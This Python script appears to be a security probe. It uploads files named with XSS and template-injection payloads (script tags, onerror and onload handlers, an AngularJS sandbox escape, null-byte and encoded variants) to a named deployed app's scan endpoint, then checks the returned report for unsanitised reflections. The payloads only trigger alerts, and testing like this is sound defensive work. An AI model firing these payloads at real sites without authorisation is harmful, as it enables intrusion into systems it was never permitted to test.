#!/usr/bin/env python3
"""
xss_report_probe.py
Category : XSS via Filename / Report Reflection
Target   : /scan/file (returns structured HTML security report)

The app reflects the uploaded filename and possibly file content
into an HTML report. This script tests whether those reflections
are properly sanitised.

Indicators of vulnerability:
  - Browser alert box on report page
  - <script> tags appear unsanitised in report HTML
  - Event handler attributes (onerror, onload) in response body

Usage:
    pip install requests
    python3 xss_report_probe.py
"""

import io
import requests
from html.parser import HTMLParser

TARGET        = "https://dev-guardian-production.up.railway.app"
FILE_ENDPOINT = f"{TARGET}/scan/file"

BENIGN_CONTENT = b"# benign python file\nprint('hello')\n"

# ── XSS Payload Variants ─────────────────────────────────────────────────────

XSS_FILENAMES = [
    # Stored XSS — script tag in filename
    ("<script>alert('XSS-FILENAME')</script>.py",
     "Script tag in filename"),

    # IMG onerror — survives HTML encode on attribute values
    ('"><img src=x onerror="alert(\'XSS-IMG\')">_.py',
     "IMG onerror in filename"),

    # SVG onload
    ("test<svg/onload=alert('XSS-SVG')>.py",
     "SVG onload in filename"),

    # Template injection — Jinja2/Twig/Nunjucks
    ("{{7*7}}.py",
     "Template SSTI probe (expect '49' in report if vulnerable)"),

    # Angular template injection
    ("{{constructor.constructor('alert(1)')()}}.py",
     "AngularJS sandbox escape"),

    # Null byte — may truncate sanitiser checks
    ("safe\x00<script>alert(1)</script>.py",
     "Null byte bypass"),

    # URL-encoded
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E.py",
     "URL-encoded script tag"),

    # Double-encoded
    ("%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E.py",
     "Double URL-encoded script tag"),

    # CSS expression (IE legacy)
    ("style=xss:expression(alert(1)).py",
     "CSS expression injection"),

    # JavaScript URI
    ("javascript:alert(1).py",
     "JavaScript URI scheme"),
]

# ── HTML Parser to detect unsanitised payloads ───────────────────────────────

class XSSDetector(HTMLParser):
    def __init__(self):
        super().__init__()
        self.findings = []

    def handle_starttag(self, tag, attrs):
        DANGEROUS_TAGS  = {"script", "iframe", "object", "embed", "link"}
        DANGEROUS_ATTRS = {"onerror", "onload", "onclick", "onmouseover",
                           "onfocus", "onblur", "src", "href", "action"}
        if tag in DANGEROUS_TAGS:
            self.findings.append(f"Dangerous tag: <{tag}>")
        for attr, val in attrs:
            if attr in DANGEROUS_ATTRS and val and (
                "javascript:" in (val or "").lower() or
                "alert" in (val or "").lower() or
                "expression" in (val or "").lower()
            ):
                self.findings.append(f"Dangerous attribute: {attr}={val!r}")

def check_response_for_xss(response_text: str, payload_desc: str) -> list:
    """Scan the HTML report for unsanitised XSS payloads."""
    findings = []

    # Raw string presence checks
    raw_indicators = [
        "<script>", "onerror=", "onload=", "javascript:",
        "alert(", "expression(", "{{7*7}}", "49"  # SSTI result
    ]
    for indicator in raw_indicators:
        if indicator.lower() in response_text.lower():
            findings.append(f"  [!] Raw indicator found in response: {indicator!r}")

    # Parse HTML structure
    detector = XSSDetector()
    try:
        detector.feed(response_text)
        for f in detector.findings:
            findings.append(f"  [!] HTML parser finding: {f}")
    except Exception:
        pass

    return findings

# ── Main Test Runner ─────────────────────────────────────────────────────────

def run_xss_probes():
    print("=" * 60)
    print("XSS via Filename / Report Reflection Probe")
    print(f"Target: {FILE_ENDPOINT}")
    print("=" * 60)
    print()

    total_findings = 0

    for filename, description in XSS_FILENAMES:
        print(f"  Payload : {description}")
        print(f"  Filename: {repr(filename)}")

        files = {
            "file": (filename, io.BytesIO(BENIGN_CONTENT), "text/x-python")
        }

        try:
            res = requests.post(FILE_ENDPOINT, files=files, timeout=30)
            body = res.text

            findings = check_response_for_xss(body, description)

            if findings:
                print(f"  Status  : HTTP {res.status_code} — ✗ POTENTIAL XSS")
                for f in findings:
                    print(f)
                total_findings += len(findings)
            else:
                print(f"  Status  : HTTP {res.status_code} — ✓ Sanitised")

        except requests.exceptions.ConnectionError:
            print("  Status  : CONNECTION ERROR")
        except requests.exceptions.Timeout:
            print("  Status  : TIMEOUT")
        except Exception as e:
            print(f"  Status  : ERROR — {e}")

        print()

    print("=" * 60)
    if total_findings:
        print(f"RESULT: {total_findings} potential XSS indicators found.")
        print("        Review flagged responses in Burp Suite for confirmation.")
    else:
        print("RESULT: No XSS indicators detected. Manual review recommended.")
    print()
    print("References:")
    print("  OWASP A03:2021 — Injection")
    print("  OWASP Testing Guide — OTG-INPVAL-001")

if __name__ == "__main__":
    run_xss_probes()
